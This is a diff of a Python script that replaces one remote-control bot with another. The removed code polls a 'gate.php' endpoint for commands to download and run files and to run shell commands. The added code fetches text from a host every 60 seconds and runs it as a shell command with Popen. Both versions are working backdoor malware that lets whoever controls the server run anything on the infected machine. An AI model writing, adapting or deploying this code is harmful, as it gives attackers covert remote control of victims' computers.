@@ -1,121 +1,82 @@
-from os import system
+import socket
 from time import sleep
-from random import randint
+from subprocess import Popen
 
-_ver = 0
 
-_scheme = "http://"
-_host = "localhost"
-_gate = "/gate.php"
+# Domain only
+URL = 'localhost'
 
-_sleep = 10
-_save = '/tmp'
-_ext = ['exe', 'run', 'sh', 'php', 'bat']
 
-try:
-    from urllib2 import urlopen
-    _ver = 2
-except:
-    try:
-        from urllib3 import PoolManager, request
-        _ver = 3
-    except:
-        try:
-            from urllib.request import urlretrieve as urlopen
-            _ver = 1
-        except:
-            import socket
+def typeof(value):
+    # Check type of value
+    if value.isnumeric():
+        # Return int var if numeric
+        return int(value)
+    else:
+        # Return str if not numeric
+        return str(value)
 
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((_host, 80))
-            s.send(bytes("GET /false.php HTTP/1.1\nHost: {0}\n\n".format(_host), 'utf8'))
-            s.close()
 
-            exit()
+def parse(text):
+    out = {}
 
-def _ext_check(link):
-    lnk = link.split('.')
+    text = text.split('\r\n')
+    del text[0]
 
-    if len(lnk) > 2:
-        lnk = lnk[len(lnk)-1]
+    for string in text:
+        string = string.split(': ', 1)
+        out[string[0].lower()] = typeof(string[1])
 
-        if '/' not in lnk:
-            if lnk in _ext:
-                return '.'+lnk
-    
-    return ''
+    return out
 
-def receive(link, need=True):
-    _cmd = ''
 
-    try:
-        if _ver == 1:
-            r = urlopen(link)
+def receive():
+    # Var for future resp. text
+    data = ''
 
-            if need:
-                _cmd = r.read().decode('utf-8')
-        elif _ver == 2:
-            r = urlopen(link)
+    # Open socket connection on 80 port to index page of host
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((URL, 80))
+    s.send(
+        bytes("GET / HTTP/1.1\nHost: {0}\n\n".format(URL), 'utf8')
+    )
 
-            if need:
-                _cmd = r.read().decode('utf-8')
-        else:
-            c = PoolManager()
-            r = c.request('GET', link, preload_content=False)
+    # Receive first 8192 bytes of headers/text
+    temp = s.recv(8192)
+    # Decode received bytes and split to two parts (headers/text)
+    temp = temp.decode('utf-8').split('\r\n\r\n', 1)
 
-            if need:
-                _cmd = r.read(decode_content=True)
+    # Receive Content-Length value and add second (text) part to data
+    clen = parse(temp[0])['content-length']
+    data += temp[1]
 
-            r.release_conn()
-    except:
-        pass
+    # If we don`t received all text, receive it to end
+    while len(data) != clen:
+        temp = s.recv(8192).decode('utf-8')
+        data += temp
 
-    return _cmd
+    # Close socket connection
+    s.close()
 
-def dwld_exec(link, agr):
-    try:
-        _tmp = _save + '/my_file-{0}{1}'.format(randint(0,10000), _ext_check(link))
+    # Return text resp. but remove last \r\n\r\n
+    if data.endswith('\r\n\r\n'):
+        return data[:-2]
+    else:
+        return data
 
-        if _ver == 1:
-            _tmp2 = urlopen(link, _tmp)
-        elif _ver == 2:
-            _tmp2 = urlopen(link)
-            _path = open(_tmp, 'wb').write(_tmp2.read())
-        else:
-            c = PoolManager()
-            r = c.request('GET', link, preload_content=False)
-            
-            with open(_tmp, 'wb') as out:
-                while True:
-                    data = r.read(1000000)
-
-                    if not data:
-                        break
-
-                    out.write(data)
-            
-            r.release_conn()
-
-        system(_tmp2 + ' ' + agr)
-    except:
-        pass
-
-    return ''
 
 if __name__ == "__main__":
     while True:
-        tmp = receive(_scheme+_host+_gate).split("||")
+        tmp = receive()
 
-        if tmp[0] == "d&e":
-            dwld_exec(tmp[1], '')
-        elif tmp[0] == "o_s":
-            receive(tmp[1], False)
-        elif tmp[0] == "de&agr":
-            dwld_exec(tmp[1], tmp[2])
-        elif tmp[0] == "sys":
-            try:
-                system(tmp[1])
-            except:
-                pass
+        if len(tmp) > 0:
+            Popen(
+                tmp,
+                close_fds=True,
+                stdin=None,
+                stdout=None,
+                stderr=None,
+                shell=True
+            )
 
-        sleep(_sleep)
+        sleep(60)
